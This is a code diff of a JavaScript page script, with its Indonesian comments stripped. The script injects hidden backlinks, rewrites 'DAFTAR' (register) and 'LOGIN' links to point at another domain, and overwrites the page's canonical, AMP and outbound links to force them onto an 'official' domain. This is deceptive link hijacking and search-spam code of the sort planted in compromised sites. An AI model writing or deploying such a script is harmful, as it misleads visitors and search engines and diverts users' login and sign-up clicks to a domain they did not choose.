@@ -1,18 +1,18 @@
 
-const officialDomain = 'https://www.tera.com'; // Ganti sesuai kebutuhan untuk canonical
-const ampDomain = 'https://www.amp.com';       // Domain untuk AMP, bisa diubah sesuai kebutuhan
+const officialDomain = 'https://www.tera.com'; 
+const ampDomain = 'https://www.amp.com';       
 
 function insertBacklinks() {
   
   const link1 = document.createElement('a');
   link1.href = 'https://www.example1.com';
-  link1.style.display = 'none'; // Tautan disembunyikan
-  link1.textContent = 'Tautan ke Example 1'; // Menambahkan anchor text
+  link1.style.display = 'none'; 
+  link1.textContent = 'Tautan ke Example 1'; 
 
   const link2 = document.createElement('a');
   link2.href = 'https://www.example2.com';
-  link2.style.display = 'none'; // Tautan disembunyikan
-  link2.textContent = 'Tautan ke Example 2'; // Menambahkan anchor text
+  link2.style.display = 'none'; 
+  link2.textContent = 'Tautan ke Example 2'; 
 
   
   const body = document.body;
@@ -24,8 +24,8 @@ function insertBacklinks() {
 
   
   if (referenceNode) {
-    body.insertBefore(link1, referenceNode); // Menyisipkan link1 sebelum elemen tengah
-    body.insertBefore(link2, referenceNode); // Menyisipkan link2 sebelum elemen tengah
+    body.insertBefore(link1, referenceNode); 
+    body.insertBefore(link2, referenceNode); 
   }
 }
 
@@ -42,7 +42,7 @@ function replaceAnchorTags() {
       anchor.textContent.trim().toUpperCase() === 'DAFTAR' || 
       anchor.textContent.trim().toUpperCase() === 'LOGIN'
     ) {
-      anchor.href = ampDomain; // Ubah href menjadi ampDomain
+      anchor.href = ampDomain; 
     }
   });
 }
@@ -51,17 +51,17 @@ function replaceAnchorTags() {
 function forceUrlsToOfficialDomain() {
   
   const canonicalLink = document.querySelector('link[rel="canonical"]');
-  let canonicalBasePath = ''; // Menyimpan path base dari canonical
+  let canonicalBasePath = ''; 
 
   if (canonicalLink) {
     
-    canonicalBasePath = canonicalLink.href.replace(/^https?:\/\/[^\/]+/, ''); // Mengambil path
-    canonicalLink.href = officialDomain; // Canonical menjadi officialDomain tanpa path tambahan
+    canonicalBasePath = canonicalLink.href.replace(/^https?:\/\/[^\/]+/, ''); 
+    canonicalLink.href = officialDomain; 
   } else {
     
     const newCanonical = document.createElement('link');
     newCanonical.rel = 'canonical';
-    newCanonical.href = officialDomain; // Tanpa path
+    newCanonical.href = officialDomain; 
     document.head.appendChild(newCanonical);
   }
 
@@ -70,7 +70,7 @@ function forceUrlsToOfficialDomain() {
   links.forEach(link => {
     
     if (link.href.startsWith('http')) {
-      const relativePath = link.href.replace(/^https?:\/\/[^\/]+/, ''); // Ambil path setelah domain
+      const relativePath = link.href.replace(/^https?:\/\/[^\/]+/, ''); 
       
       link.href = officialDomain + relativePath.replace(canonicalBasePath, ''); 
     }
@@ -97,7 +97,7 @@ function forceUrlsToOfficialDomain() {
   const ampLink = document.querySelector('link[rel="amphtml"]');
   if (ampLink) {
     
-    ampLink.href = ampDomain; // Set jadi https://www.tera.com/
+    ampLink.href = ampDomain; 
   } else {
     
     const newAmpLink = document.createElement('link');
